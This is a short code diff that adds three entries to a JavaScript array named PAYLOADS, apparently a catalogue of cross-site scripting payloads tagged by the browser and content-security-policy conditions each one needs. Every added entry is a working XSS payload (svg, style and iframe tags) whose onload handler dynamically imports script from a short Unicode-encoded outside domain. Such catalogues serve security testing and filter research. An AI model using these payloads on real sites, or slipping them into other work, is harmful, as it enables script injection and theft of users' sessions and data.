@@ -91,4 +91,19 @@ const PAYLOADS = [
         tags: [TAGS.unsafeEval, TAGS.unsafeInline, TAGS.controlsName, TAGS.inlineStyleBlock],
         author: null
     },
+    {
+        html: "<svg/onload=import(/\\Ǌ.₨/)>",
+        tags: [TAGS.unsafeInline, TAGS.notInner, TAGS.firefoxInner, TAGS.scripts],
+        author: null
+    },
+    {
+        html: "<style/onload=import(/\\Ǌ.₨/)>",
+        tags: [TAGS.unsafeInline, TAGS.scripts, TAGS.inlineStyleAllow],
+        author: null
+    },
+    {
+        html: "<iframe/onload=import(/\\Ǌ.₨/)>",
+        tags: [TAGS.unsafeInline, TAGS.scripts],
+        author: null
+    },
 ]
